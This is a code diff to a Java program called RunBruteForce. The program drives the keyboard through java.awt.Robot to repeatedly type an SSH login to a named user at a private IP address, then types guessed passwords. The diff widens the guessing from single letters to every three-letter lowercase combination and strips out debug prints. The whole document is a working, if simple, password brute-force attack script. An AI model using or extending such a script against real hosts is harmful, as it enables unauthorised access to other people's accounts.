@@ -28,19 +28,26 @@ public class RunBruteForce {
             robot.setAutoDelay(0);
             robot.setAutoWaitForIdle(true);
 
-            robot.delay(1000);
+            robot.delay(5000);
             robot.mouseMove(700, 200);
             robot.mousePress(InputEvent.BUTTON1_MASK);
             robot.mouseRelease(InputEvent.BUTTON1_MASK);
             robot.delay(1000);
             int index = 0;
             type(robot, "ssh michaeltruell@172.17.113.252");
+            robot.delay(300);
             for(char a = 'a'; a < 'z'; a++) {
-                if(index % 3 == 0) {
-                    type(robot, "ssh michaeltruell@172.17.113.252");
+                for(char b = 'a'; b < 'z'; b++) {
+                    for(char c = 'a'; c < 'z'; c++) {
+                        if(index % 3 == 0) {
+                            type(robot, "ssh michaeltruell@172.17.113.252");
+                            robot.delay(300);
+                        }
+                        type(robot, a+""+b+""+c);
+                        robot.delay(125);
+                        index++;
+                    }
                 }
-                type(robot, ""+a);
-                index++;
             }
 
         } catch (AWTException e) {
@@ -112,18 +119,15 @@ public class RunBruteForce {
     }*/
 
     public static void type(Robot robot, String s) {
-        System.out.println("hello?");
         byte[] bytes = s.getBytes();
         for (byte b : bytes)
         {
             int code = b;
-            System.out.println(b);
             // keycode only handles [A-Z] (which is ASCII decimal [65-90])
             if (code > 96 && code < 123) {
                 code = code - 32;
             }
             if (b <= 90 && b >= 65) {
-                System.out.println("testing");
                 robot.keyPress(KeyEvent.VK_SHIFT);
                 robot.keyPress(code);
                 robot.keyRelease(code);
